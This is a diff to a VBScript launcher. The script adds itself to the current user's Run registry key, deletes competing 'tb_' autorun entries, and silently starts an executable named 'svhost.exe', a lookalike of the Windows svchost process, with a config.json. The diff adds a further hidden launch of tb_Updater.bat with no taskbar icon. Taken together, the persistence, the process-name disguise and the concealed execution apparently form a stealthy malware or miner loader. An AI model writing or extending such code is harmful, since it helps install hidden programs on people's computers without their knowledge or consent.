@@ -8,7 +8,7 @@ currentDir = objFSO.GetParentFolderName(scriptPath)
 
 ' Registry Run Key path
 regRunKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
-appKeyName = "tb_run_updater" ' Change this to your preferred unique registry value name
+appKeyName = "tb_run_updater" ' Unique registry value name
 
 ' 1. Add itself to the Registry Run key if not already present
 On Error Resume Next
@@ -20,8 +20,6 @@ End If
 Err.Clear
 
 ' 2. Remove any other entries in the Run key that start with "tb_" (except itself)
-' VBScript doesn't natively list registry keys easily without WMI, but we can manage known ones or use WMI.
-' Alternatively, using WMI to enumerate registry values under CurrentVersion\Run:
 Const HKEY_CURRENT_USER = &H80000001
 Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
 
@@ -39,11 +37,17 @@ If IsArray(values) Then
 End If
 On Error GoTo 0
 
-' 3. Switch to the script's directory and run svhost.exe quietly
+' 3. Switch to the script's directory
 objShell.CurrentDirectory = currentDir
 
-' Run svhost.exe in the background (0 = hide window, False = don't wait for process to finish)
-' Ensure svhost.exe and config.json are located in the same folder as this script.
+' 4. Run svhost.exe quietly if it exists
 If objFSO.FileExists(objFSO.BuildPath(currentDir, "svhost.exe")) Then
     objShell.Run """svhost.exe"" -c ""config.json""", 0, False
+End If
+
+' 5. Run tb_Updater.bat silently in the background without taskbar icon
+batPath = objFSO.BuildPath(currentDir, "tb_Updater.bat")
+If objFSO.FileExists(batPath) Then
+    ' 0 = Hide window / run completely hidden, False = don't wait for completion
+    objShell.Run """" & batPath & """", 0, False
 End If
